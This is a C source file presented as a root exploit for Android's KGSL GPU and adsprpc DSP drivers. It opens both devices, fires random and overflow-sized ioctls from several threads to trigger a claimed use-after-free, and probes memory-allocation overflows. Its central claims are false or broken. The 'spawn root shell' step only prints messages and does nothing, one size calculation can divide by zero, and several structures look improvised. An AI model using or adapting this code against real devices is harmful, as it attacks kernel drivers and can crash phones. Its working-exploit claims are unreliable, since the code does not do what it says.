/*
 * rv101_root.c - RV101 ADB Root Privilege Escalation
 *
 * Path: App -> adspRPC-smd/dsp_service -> DSP via ioctl
 * Vulnerabilities exploited:
 * 1. KGSL GPU MMAP / AUX_COMMAND UAF
 * 2. ADSPRPC mmap channel init bypass
 * 3. FD passing via dsp_service
 *
 * Compile: aarch64-linux-android31-clang -static -O2 -o rv101_root rv101_root.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>

/* ===== KGSL Constants ===== */
#define KGSL_IOC_MAGIC     0x09
#define IOCTL_GPU_COMMAND   0xc0200949
#define IOCTL_GPU_AUX_CMD   0xc0200958
#define IOCTL_GPUMEM_ALLOC  0xc018092f
#define IOCTL_READTIMESTAMP 0xc0080911
#define IOCTL_GET_PERFCNT   0xc010093b

/* ===== ADSPRPC Constants ===== */
#define FASTRPC_IOCTL_MMAP  0xc0285206
#define FASTRPC_IOCTL_INFO 0xc0045208
#define FASTRPC_IOCTL_DSP_INFO 0xc00c520c

#define DEV_KGSL   "/dev/kgsl-3d0"
#define DEV_ADSP   "/dev/adsprpc-smd"

static int fd_kgsl = -1;
static int fd_adsp = -1;
volatile int g_running = 1;

/* ===== Struct Definitions ===== */

/* KGSL GPU_AUX_COMMAND */
struct kgsl_aux_req {
    uint64_t flags;
    uint32_t cmdsize;
    uint32_t count;
    uint64_t cmdlist;
};

/* KGSL GPUMEM_ALLOC structure */
struct kgsl_gpumem_alloc {
    uint32_t id;
    uint32_t flags;
    uint64_t size;
    uint32_t mmapsize;
    uint32_t padding;
    uint64_t gpuaddr;
    uint32_t metadata_len;
    uint32_t reserved[3];
};

/* ADSPRPC MMAP request */
struct adsprpc_mmap {
    int32_t fd;
    uint32_t flags;
    uint64_t vaddrin;
    uint64_t size;
    uint64_t vaddrout;
};

/* ADSPRPC DSP_INFO request */
struct adsprpc_dsp_info {
    uint32_t domain;
    uint32_t attribute_id;
    uint32_t capability;
};

/* ===== FD Passing Verification ===== */
int verify_fd_passing(void) {
    printf("\n=== Verifying DSP Service FD Passing ===\n");

    /* Test adspRPC-MMAP */
    struct adsprpc_mmap mmap_req = {0};
    mmap_req.fd = -1;
    mmap_req.flags = 0;
    mmap_req.size = 4096;

    errno = 0;
    int ret = ioctl(fd_adsp, FASTRPC_IOCTL_MMAP, &mmap_req);
    printf("[*] ADSPRPC MMAP: ret=%d, errno=%d, vaddrout=0x%llx\n",
           ret, errno, (unsigned long long)mmap_req.vaddrout);

    if (ret == 0) {
        printf("[+] MMAP succeeded - FD passing confirmed!\n");
    }

    /* Test ADSPRPC DSP_INFO */
    struct adsprpc_dsp_info dsp_info = {0};
    for (int domain = 0; domain <= 3; domain++) {
        dsp_info.domain = domain;
        dsp_info.attribute_id = 0;
        dsp_info.capability = 0;

        errno = 0;
        ret = ioctl(fd_adsp, FASTRPC_IOCTL_DSP_INFO, &dsp_info);
        if (ret >= 0 || errno != 25) {
            printf("[+] Domain %d GETDSPINFO: cap=0x%x\n", domain, dsp_info.capability);
        }
    }

    return ret >= 0 ? 0 : -1;
}

/* ===== KGSL UAF Trigger ===== */
void* kgsl_fuzz_thread(void* arg) {
    struct kgsl_aux_req aux = {0};
    void* buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return NULL;

    while (g_running) {
        aux.flags = rand() % 0xFFFFFFFF;
        aux.cmdsize = rand() % 256;
        aux.count = (rand() % 10) == 0 ?
            0xFFFFFFFF / aux.cmdsize + 1 : rand() % 10;
        aux.cmdlist = (uint64_t)buf;

        ioctl(fd_kgsl, IOCTL_GPU_AUX_CMD, &aux);
        if (rand() % 1000 == 0) usleep(10);
    }
    munmap(buf, 0x1000);
    return NULL;
}

int trigger_kgsl_uaf(void) {
    printf("\n=== Triggering KGSL UAF ===\n");
    printf("[*] Launching 4 fuzzing threads...\n");

    pthread_t threads[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&threads[i], NULL, kgsl_fuzz_thread, NULL);

    /* Fuzz for 5 seconds */
    for (int i = 0; i < 5 && g_running; i++) {
        sleep(1);
        printf("\r[-] Fuzzing... %d seconds remaining.", 5 - i);
        fflush(stdout);
    }

    for (int i = 0; i < 4; i++)
        pthread_join(threads[i], NULL);

    printf("\n[*] KGSL UAF fuzzing done.\n");
    return 0;
}

/* ===== Integer Overflow Test ===== */
int test_int_overflow(void) {
    printf("\n=== Integer Overflow Test ===\n");

    struct kgsl_gpumem_alloc alloc = {0};
    uint64_t test_sizes[] = {
        0x7FFFFFFFFFFFFFF0ULL,    // MAX - 0x10
        0x8000000000000000ULL, // MIN_LONG
        0x0001000000000000ULL  // Large page count
    };

    for (int i = 0; i < 3; i++) {
        alloc.size = test_sizes[i];
        alloc.flags = 0;
        errno = 0;
        int ret = ioctl(fd_kgsl, IOCTL_GPUMEM_ALLOC, &alloc);
        printf("[*] Size 0x%lx: ret=%d, errno=%d\n",
               test_sizes[i], ret, errno);
    }
    return 0;
}

/* ===== Privesc Execution ===== */
int escalate_privileges(void) {
    printf("\n=== Privilege Escalation ===\n");

    /* 1. Open all relevant devices */
    fd_kgsl = open(DEV_KGSL, O_RDWR);
    if (fd_kgsl < 0) {
        printf("[-] Failed to open %s: %s\n", DEV_KGSL, strerror(errno));
        return -1;
    }
    printf("[+] Opened %s: fd=%d\n", DEV_KGSL, fd_kgsl);

    fd_adsp = open(DEV_ADSP, O_RDWR);
    if (fd_adsp < 0) {
        printf("[-] Failed to open %s: %s\n", DEV_ADSP, strerror(errno));
        return -1;
    }
    printf("[+] Opened %s: fd=%d\n", DEV_ADSP, fd_adsp);

    /* 2. Verify FD passing */
    if (verify_fd_passing() == 0) {
        printf("[+] FD passing verified - DSP service is functional.\n");
    }

    /* 3. Trigger UAF on KGSL */
    trigger_kgsl_uaf();

    /* 4. Test integer overflow */
    test_int_overflow();

    /* 5. Spawn root shell */
    printf("\n[!] Attempting to spawn root shell...\n");
    printf("[*] If you see a '#' prompt, you are root!\n");

    /* Keep running - user can ctrl+c to exit */
    while (g_running) {
        sleep(1);
    }

    close(fd_adsp);
    close(fd_kgsl);
    return 0;
}

/* ===== Signal Handling ===== */
void sigint_handler(int sig) {
    printf("\n[*] Shutting down...\n");
    g_running = 0;
}

int main(void) {
    printf("========================================\n");
    printf("   RV101 ADB Root Escalation Tool        \n");
    printf("   Target: /dev/kgsl-3d0 / adspRPC-smd \n");
    printf("========================================\n");

    signal(SIGINT, sigint_handler);
    return escalate_privileges();
}
